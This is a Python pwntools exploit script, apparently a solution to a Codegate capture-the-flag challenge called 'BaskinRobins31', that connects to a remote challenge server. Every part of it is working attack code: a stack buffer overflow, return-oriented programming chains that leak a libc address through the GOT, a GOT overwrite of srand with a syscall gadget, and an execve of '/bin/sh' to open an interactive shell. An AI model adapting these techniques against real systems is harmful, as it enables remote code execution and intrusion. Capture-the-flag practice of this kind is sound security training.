from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./BaskinRobins31"

bin = ELF(file)

#conn = process(file)
#gdb.attach(conn)
conn = remote("ch41l3ng3s.codegate.kr", 3131)

def game(rop_payload):
    conn.recvuntil("want to take ? (1-3)\n")
    payload = "5 " + "a"*(0xb0 - 2) + "a"*8 + \
              rop_payload
    conn.send(payload)
    conn.recvuntil("rules...:( \n")


pop_rdi = 0x0000000000400bc3
pop_rdx = 0x000000000040087c
pop_rdi_rsi_rdx = 0x000000000040087a
bin_sh_addr = 0x0000000000602078

def a_read(addr, l):
    payload = p64(pop_rdi_rsi_rdx) + \
              p64(1) + \
              p64(addr) + \
              p64(l) + \
              p64(bin.symbols['write']) + \
              p64(bin.symbols['main'])
    game(payload)
    return conn.recvn(l)

def a_write(addr, data):
    payload = p64(pop_rdi_rsi_rdx) + \
              p64(0) + \
              p64(addr) + \
              p64(len(data)) + \
              p64(bin.symbols['read']) + \
              p64(bin.symbols['main'])
    game(payload)
    conn.send(data)

read_addr = u64(a_read(bin.got['read'], 8))

# Leaking read bytes
read_bytes = a_read(read_addr, 20)
syscall_addr = read_addr + read_bytes.index('\x0f')

a_write(bin.got['srand'], p64(syscall_addr))

a_write(bin_sh_addr, "/bin/sh\x00")

payload = p64(pop_rdi_rsi_rdx) + \
          p64(0) + \
          p64(bin_sh_addr + 0x20) + \
          p64(59) + \
          p64(bin.symbols['read']) + \
          p64(pop_rdi_rsi_rdx) + \
          p64(bin_sh_addr) + \
          p64(0) + \
          p64(0) + \
          p64(bin.symbols['srand'])
game(payload)
conn.send("a"*59)

log.info("Read addr: " + hex(read_addr))
log.info("Syscall addr: " + hex(syscall_addr))

conn.interactive()
